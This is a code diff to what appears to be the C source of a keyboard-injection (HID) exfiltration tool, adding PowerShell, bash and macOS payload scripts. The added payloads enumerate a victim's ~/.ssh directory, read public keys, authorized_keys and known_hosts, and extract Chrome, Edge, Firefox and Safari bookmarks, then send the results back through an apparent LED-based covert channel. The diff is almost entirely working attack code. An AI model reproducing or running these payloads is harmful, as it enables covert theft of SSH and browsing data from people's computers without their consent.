@@ -156,6 +156,51 @@ static const char* ps_sysinfo =
     "$result = \"Hostname: $hostname`nUser: $user`nOS: $os`nIP: $ip`n\"\r\n"
     "Send-LEDData $result\r\n";
 
+/* SSH Keys - Windows */
+static const char* ps_ssh_keys =
+    "$ssh_dir = \"$env:USERPROFILE\\.ssh\"\r\n"
+    "$result = ''\r\n"
+    "if (Test-Path $ssh_dir) {\r\n"
+    "  $files = Get-ChildItem -Path $ssh_dir -File 2>$null\r\n"
+    "  $result += \"[SSH key files]: \" + ($files.Name -join ', ') + \"`n\"\r\n"
+    "  foreach ($name in @('id_rsa.pub','id_ed25519.pub','authorized_keys','known_hosts')) {\r\n"
+    "    $path = Join-Path $ssh_dir $name\r\n"
+    "    if (Test-Path $path) {\r\n"
+    "      $result += \"[$name]`n\" + (Get-Content $path -Raw 2>$null) + \"`n\"\r\n"
+    "    }\r\n"
+    "  }\r\n"
+    "} else {\r\n"
+    "  $result = '[.ssh directory not found]'\r\n"
+    "}\r\n"
+    "Send-LEDData $result\r\n";
+
+/* Browser Bookmarks - Windows */
+static const char* ps_browser_bookmarks =
+    "$result = ''\r\n"
+    "$chrome = \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Bookmarks\"\r\n"
+    "$edge   = \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Bookmarks\"\r\n"
+    "foreach ($browser_path in @($chrome, $edge)) {\r\n"
+    "  if (Test-Path $browser_path) {\r\n"
+    "    $label = if ($browser_path -match 'Chrome') { 'Chrome' } else { 'Edge' }\r\n"
+    "    $json = Get-Content $browser_path -Raw 2>$null | ConvertFrom-Json\r\n"
+    "    function Extract-Bookmarks($node) {\r\n"
+    "      if ($node.type -eq 'url') {\r\n"
+    "        return \"$($node.name) | $($node.url)\"\r\n"
+    "      }\r\n"
+    "      $out = @()\r\n"
+    "      if ($node.children) {\r\n"
+    "        foreach ($child in $node.children) { $out += Extract-Bookmarks $child }\r\n"
+    "      }\r\n"
+    "      return $out\r\n"
+    "    }\r\n"
+    "    $roots = $json.roots.PSObject.Properties.Value\r\n"
+    "    $entries = foreach ($r in $roots) { Extract-Bookmarks $r }\r\n"
+    "    $result += \"[$label Bookmarks]`n\" + ($entries -join \"`n\") + \"`n\"\r\n"
+    "  }\r\n"
+    "}\r\n"
+    "if (-not $result) { $result = '[no browser bookmarks found]' }\r\n"
+    "Send-LEDData $result\r\n";
+
 /* Custom Script - Windows (placeholder that reads from a file) */
 static const char* ps_custom =
     "$result = 'Custom script placeholder - replace with your payload'\r\n"
@@ -198,6 +243,51 @@ static const char* bash_sysinfo =
     "o=$(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"')\r\n"
     "ip=$(hostname -I 2>/dev/null | awk '{print $1}')\r\n"
     "result=\"Hostname: ${h}\\nUser: ${u}\\nOS: ${o}\\nIP: ${ip}\"\r\n"
+    "send_led_data \"$(echo -e \"$result\")\"\r\n";
+
+/* SSH Keys - Linux */
+static const char* bash_ssh_keys =
+    "ssh_dir=\"$HOME/.ssh\"\r\n"
+    "result=''\r\n"
+    "if [ -d \"$ssh_dir\" ]; then\r\n"
+    "  result=\"[SSH key files]: $(ls \"$ssh_dir\" 2>/dev/null | tr '\\n' ' ')\\n\"\r\n"
+    "  for name in id_rsa.pub id_ed25519.pub authorized_keys known_hosts; do\r\n"
+    "    f=\"$ssh_dir/$name\"\r\n"
+    "    if [ -f \"$f\" ]; then\r\n"
+    "      result=\"${result}[$name]\\n$(cat \"$f\" 2>/dev/null)\\n\"\r\n"
+    "    fi\r\n"
+    "  done\r\n"
+    "else\r\n"
+    "  result='[.ssh directory not found]'\r\n"
+    "fi\r\n"
+    "send_led_data \"$(echo -e \"$result\")\"\r\n";
+
+/* Browser Bookmarks - Linux */
+static const char* bash_browser_bookmarks =
+    "result=''\r\n"
+    "chrome_bm=\"$HOME/.config/google-chrome/Default/Bookmarks\"\r\n"
+    "if [ -f \"$chrome_bm\" ]; then\r\n"
+    "  result=\"[Chrome Bookmarks]\\n\"\r\n"
+    "  result=\"${result}$(python3 -c \"\r\n"
+    "import json,sys\r\n"
+    "def walk(n):\r\n"
+    "  if n.get('type')=='url': print(n['name'],'|',n['url'])\r\n"
+    "  for c in n.get('children',[]): walk(c)\r\n"
+    "d=json.load(open('$chrome_bm'))\r\n"
+    "for r in d['roots'].values(): walk(r)\r\n"
+    "\" 2>/dev/null)\\n\"\r\n"
+    "fi\r\n"
+    "ff_db=$(find \"$HOME/.mozilla/firefox\" -name 'places.sqlite' 2>/dev/null | head -1)\r\n"
+    "if [ -f \"$ff_db\" ]; then\r\n"
+    "  result=\"${result}[Firefox Bookmarks]\\n\"\r\n"
+    "  result=\"${result}$(python3 -c \"\r\n"
+    "import sqlite3,sys\r\n"
+    "con=sqlite3.connect('$ff_db')\r\n"
+    "for row in con.execute(\\\"SELECT b.title,p.url FROM moz_bookmarks b JOIN moz_places p ON b.fk=p.id WHERE p.url NOT LIKE 'place:%'\\\"):\r\n"
+    "  print(row[0],'|',row[1])\r\n"
+    "\" 2>/dev/null)\\n\"\r\n"
+    "fi\r\n"
+    "if [ -z \"$result\" ]; then result='[no browser bookmarks found]'; fi\r\n"
     "send_led_data \"$(echo -e \"$result\")\"\r\n";
 
 /* Custom Script - Linux */
@@ -248,6 +338,54 @@ static const char* mac_sysinfo =
     "result=\"Hostname: ${h}\\nUser: ${u}\\nOS: ${o}\\nIP: ${ip}\"\r\n"
     "send_led_data \"$(echo -e \"$result\")\"\r\n";
 
+/* SSH Keys - Mac (same ~/.ssh paths as Linux) */
+static const char* mac_ssh_keys =
+    "ssh_dir=\"$HOME/.ssh\"\r\n"
+    "result=''\r\n"
+    "if [ -d \"$ssh_dir\" ]; then\r\n"
+    "  result=\"[SSH key files]: $(ls \"$ssh_dir\" 2>/dev/null | tr '\\n' ' ')\\n\"\r\n"
+    "  for name in id_rsa.pub id_ed25519.pub authorized_keys known_hosts; do\r\n"
+    "    f=\"$ssh_dir/$name\"\r\n"
+    "    if [ -f \"$f\" ]; then\r\n"
+    "      result=\"${result}[$name]\\n$(cat \"$f\" 2>/dev/null)\\n\"\r\n"
+    "    fi\r\n"
+    "  done\r\n"
+    "else\r\n"
+    "  result='[.ssh directory not found]'\r\n"
+    "fi\r\n"
+    "send_led_data \"$(echo -e \"$result\")\"\r\n";
+
+/* Browser Bookmarks - Mac */
+static const char* mac_browser_bookmarks =
+    "result=''\r\n"
+    "chrome_bm=\"$HOME/Library/Application Support/Google/Chrome/Default/Bookmarks\"\r\n"
+    "if [ -f \"$chrome_bm\" ]; then\r\n"
+    "  result=\"[Chrome Bookmarks]\\n\"\r\n"
+    "  result=\"${result}$(python3 -c \"\r\n"
+    "import json,sys\r\n"
+    "def walk(n):\r\n"
+    "  if n.get('type')=='url': print(n['name'],'|',n['url'])\r\n"
+    "  for c in n.get('children',[]): walk(c)\r\n"
+    "d=json.load(open('$chrome_bm'))\r\n"
+    "for r in d['roots'].values(): walk(r)\r\n"
+    "\" 2>/dev/null)\\n\"\r\n"
+    "fi\r\n"
+    "safari_bm=$(osascript -e \"\r\n"
+    "tell application \\\"Safari\\\"\r\n"
+    "  set output to \\\"\\\"\r\n"
+    "  repeat with bk in bookmarks\r\n"
+    "    try\r\n"
+    "      set output to output & name of bk & \\\" | \\\" & URL of bk & linefeed\r\n"
+    "    end try\r\n"
+    "  end repeat\r\n"
+    "  return output\r\n"
+    "end tell\" 2>/dev/null)\r\n"
+    "if [ -n \"$safari_bm\" ]; then\r\n"
+    "  result=\"${result}[Safari Bookmarks]\\n${safari_bm}\\n\"\r\n"
+    "fi\r\n"
+    "if [ -z \"$result\" ]; then result='[no browser bookmarks found]'; fi\r\n"
+    "send_led_data \"$(echo -e \"$result\")\"\r\n";
+
 /* Custom Script - Mac */
 static const char* mac_custom =
     "result='Custom script placeholder - replace with your payload'\r\n"
@@ -280,6 +418,12 @@ const char* hid_exfil_get_payload_script(PayloadType type, TargetOS os) {
         case PayloadTypeSystemInfo:
             payload = ps_sysinfo;
             break;
+        case PayloadTypeSSHKeys:
+            payload = ps_ssh_keys;
+            break;
+        case PayloadTypeBrowserBookmarks:
+            payload = ps_browser_bookmarks;
+            break;
         case PayloadTypeCustomScript:
             payload = ps_custom;
             break;
@@ -304,6 +448,12 @@ const char* hid_exfil_get_payload_script(PayloadType type, TargetOS os) {
         case PayloadTypeSystemInfo:
             payload = bash_sysinfo;
             break;
+        case PayloadTypeSSHKeys:
+            payload = bash_ssh_keys;
+            break;
+        case PayloadTypeBrowserBookmarks:
+            payload = bash_browser_bookmarks;
+            break;
         case PayloadTypeCustomScript:
             payload = bash_custom;
             break;
@@ -327,6 +477,12 @@ const char* hid_exfil_get_payload_script(PayloadType type, TargetOS os) {
             break;
         case PayloadTypeSystemInfo:
             payload = mac_sysinfo;
+            break;
+        case PayloadTypeSSHKeys:
+            payload = mac_ssh_keys;
+            break;
+        case PayloadTypeBrowserBookmarks:
+            payload = mac_browser_bookmarks;
             break;
         case PayloadTypeCustomScript:
             payload = mac_custom;
